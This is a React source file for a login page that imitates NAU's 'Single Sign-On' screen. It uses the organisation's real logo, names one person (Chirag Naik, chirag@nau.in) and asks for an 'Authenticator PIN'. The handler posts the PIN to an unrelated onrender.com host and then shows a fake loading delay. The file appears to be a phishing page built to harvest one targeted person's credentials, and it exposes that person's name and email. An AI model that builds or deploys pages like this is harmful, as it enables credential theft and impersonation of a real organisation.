import React, { useContext, useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import { FaLock } from "react-icons/fa";
import { HiOutlineRefresh } from "react-icons/hi";
import { UserContext } from "../../ContextAPI/User.Context/UserContext";

const PasswordPage = () => {
  const [pin, setPin] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const { email } = useContext(UserContext);

  const handleLogin = async (e) => {
    e.preventDefault();

    if (!pin) {
      alert("Please enter your PIN");
      return;
    }

    try {
      const res = await axios.post("https://demo-dploy-1.onrender.com/api/users/login", {
        password: pin,
        email,
      });

      const { token, user } = res.data;

      localStorage.setItem("loginuser", JSON.stringify({ token, user }));
      localStorage.setItem("islogedin", "true");

      setIsLoading(true); // show loading screen

      // Wait 3 seconds, then navigate and refresh
      setTimeout(() => {
        navigate("/");
        setTimeout(() => {
          window.location.reload(); // refresh after navigation
        }, 100);
      }, 3000);
    } catch (error) {
      console.error("Login failed:", error.response?.data || error.message);
      alert(error.response?.data?.message || "Authentication failed");
    }
  };

  return (
    <div className="min-h-screen bg-[#e5f4ea] flex items-center justify-center px-4">
      {/* Loading Overlay */}
      {isLoading && (
        <div className="fixed top-0 left-0 w-full h-full bg-white bg-opacity-80 flex flex-col items-center justify-center z-50">
          <div className="border-8 border-blue-200 border-t-blue-600 rounded-full w-20 h-20 animate-spin mb-4"></div>
          <p className="text-xl font-semibold text-gray-700">
            Logging in... Please wait 
          </p>
        </div>
      )}

      {/* Login Card */}
      <div className="bg-white rounded-xl shadow-xl p-8 sm:p-8 w-[36%] h-[40%] text-center">
        <img
          src="https://nau.in/assets/uploads/f4144-d1207-nau-logo.png"
          alt="NAU Logo"
          className="mx-auto h-24 mt-3"
        />
        <h3 className="text-md sm:text-2xl font-medium text-gray-800">
          Single Sign-On (SSO)
        </h3>
        <p className="text-gray-600 text-sm mt-2">
          Name: <span className="text-sm text-gray-600">Chirag Naik</span>
        </p>
        <p className="text-gray-600 text-sm mb-6">Username: chirag@nau.in</p>

        <div className="text-left -mt-2 mb-2 font-semibold text-black">
          Enter Your Authenticator PIN
        </div>

        {/* Form */}
        <form
          onSubmit={handleLogin}
          className="flex flex-col gap-2 text-sm font-medium"
        >
          <input
            type="password"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            placeholder="Enter PIN Here"
            className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-400 placeholder-gray-500 text-sm"
          />

          <button
            type="submit"
            className="flex justify-center items-center gap-6 w-full py-5 bg-[#7571f9] text-white font-semibold rounded-md hover:bg-[#5e5ae8]"
          >
            Login <FaLock />
          </button>
        </form>

        <button className="text-[15px] mt-2 mx-auto text-blue-500 border border-[#2a52ff] px-4 py-1.5 rounded-full hover:bg-[#2a52ff] hover:text-white transition-all">
          Forgot your PIN?
        </button>

        <button className="mt-6 cursor-pointer mx-auto flex items-center justify-center gap-1 text-black-500 border border-red-400 hover:bg-red-500 text-sm px-4 py-1.5 rounded-full text-red-600 hover:text-white">
          <HiOutlineRefresh />
          Use Different Auth Method
        </button>
      </div>
    </div>
  );
};

export default PasswordPage;
